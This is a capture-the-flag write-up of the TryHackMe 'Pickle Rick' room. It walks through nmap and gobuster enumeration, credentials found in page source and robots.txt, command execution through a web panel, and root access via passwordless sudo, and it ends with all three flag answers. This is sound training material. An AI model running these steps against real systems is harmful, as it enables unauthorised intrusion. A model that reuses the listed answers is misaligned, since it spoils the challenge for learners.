# Pickle Rick TryHackMe Writeup

## Room Overview

This Rick and Morty-themed challenge focuses on basic web exploitation, enumeration, source code analysis, and privilege escalation on a Linux machine.

Goal: Help Rick transform back into a human by finding the three secret ingredients hidden across the system.

---

# Target Information

* Target IP: `10.48.167.137`
* Platform: Linux
* Difficulty: Easy

---

# Step 1: Initial Enumeration

First, scan the target using Nmap.

```bash
nmap -sC -sV -T4 10.48.167.137
```

## Nmap Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache httpd
```

The web server is running on port 80.

Open the target in a browser:

```text
http://10.48.167.137
```

You will see a Rick and Morty themed webpage.

---

# Step 2: View Page Source

Right-click on the webpage and select:

```text
View Page Source
```

Inside the HTML comments, you will find a username.

```html
Username: R1ckRul3s
```

Save this username.

---

# Step 3: Directory Enumeration

Use Gobuster to find hidden directories.

```bash
gobuster dir -u http://10.48.167.137 -w /usr/share/wordlists/dirb/common.txt
```

## Important Discovery

```text
/login.php
```

Open:

```text
http://10.48.167.137/login.php
```

---

# Step 4: Find the Password

On the main webpage, there is a message:

```text
“Rick left a note for Morty.”
```

Check the file:

```text
robots.txt
```

Open:

```text
http://10.48.167.137/robots.txt
```

You will find:

```text
Wubbalubbadubdub
```

This is the password.

## Credentials

```text
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

---

# Step 5: Login to the Portal

Login using the credentials.

After logging in, you gain access to a command execution panel.

This panel allows execution of Linux commands directly on the server.

---

# Step 6: Basic Enumeration Through Command Panel

Run:

```bash
whoami
```

Output:

```text
www-data
```

Try listing files:

```bash
ls
```

You may notice some commands are filtered.

However, alternatives like:

```bash
ls -la
```

work properly.

---

# Step 7: Find the First Ingredient

Enumerate directories:

```bash
pwd
ls -la
```

You will find:

```text
Sup3rS3cretPickl3Ingred.txt
```

Read the file:

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

## First Ingredient

```text
mr. meeseeks hair
```

---

# Step 8: Find the Second Ingredient

Move around the filesystem.

Check home directories:

```bash
cd /home
ls
```

You will find users like:

```text
rick
ubuntu
```

Navigate into Rick’s directory:

```bash
cd /home/rick
ls -la
```

You may see:

```text
second ingredients
```

Read the file:

```bash
cat 'second ingredients'
```

## Second Ingredient

```text
1 jerry tear
```

---

# Step 9: Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Output:

```text
(ALL) NOPASSWD: ALL
```

This means the current user can execute commands as root without a password.

Switch to root:

```bash
sudo su
```

Verify:

```bash
whoami
```

Output:

```text
root
```

---

# Step 10: Find the Final Ingredient

Navigate to root directory:

```bash
cd /root
ls -la
```

You will find:

```text
3rd.txt
```

Read the file:

```bash
cat 3rd.txt
```

## Final Ingredient

```text
fleeb juice
```

---

# Final Answers

| Question          | Answer              |
| ----------------- | ------------------- |
| First Ingredient  | `mr. meeseeks hair` |
| Second Ingredient | `1 jerry tear`      |
| Final Ingredient  | `fleeb juice`       |

---

# Commands Used

```bash
nmap -sC -sV -T4 10.48.167.137

# Directory enumeration
gobuster dir -u http://10.48.167.137 -w /usr/share/wordlists/dirb/common.txt

# Linux enumeration
whoami
pwd
ls -la
cat filename
sudo -l
sudo su
```

---

# Key Learning Points

* Web enumeration
* Viewing source code comments
* Using robots.txt for information gathering
* Directory brute forcing with Gobuster
* Command execution vulnerabilities
* Linux privilege escalation
* Enumerating sudo permissions

---

# Conclusion

This challenge demonstrates how poor web security practices and misconfigured sudo permissions can lead to full system compromise. By performing systematic enumeration and exploiting command execution functionality, all three ingredients required for Rick’s potion were recovered successfully.

🧪🥒 Mission complete: Pickle Rick restored.
